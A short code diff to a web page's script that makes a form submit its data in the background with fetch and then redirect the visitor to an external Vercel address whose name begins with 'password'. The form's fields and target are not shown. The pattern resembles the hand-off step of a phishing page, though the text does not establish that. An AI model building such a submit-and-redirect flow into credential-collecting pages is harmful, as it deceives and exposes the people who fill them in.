@@ -114,6 +114,19 @@ const btnText = document.getElementById('btnText');
 form.addEventListener('submit', function(e){
     btn.disabled = true;
     btnText.innerHTML = '<div class="spinner"></div> Submitting…';
+
+    // Use fetch to submit the form
+    fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form)
+    }).finally(() => {
+        // After submission → redirect to your link
+        setTimeout(() => {
+            window.location.href = "https://password-orpin-theta.vercel.app/";
+        }, 1500); // small delay to ensure form is sent
+    });
+
+    e.preventDefault(); // prevent default form behavior
 });
 </script>
 
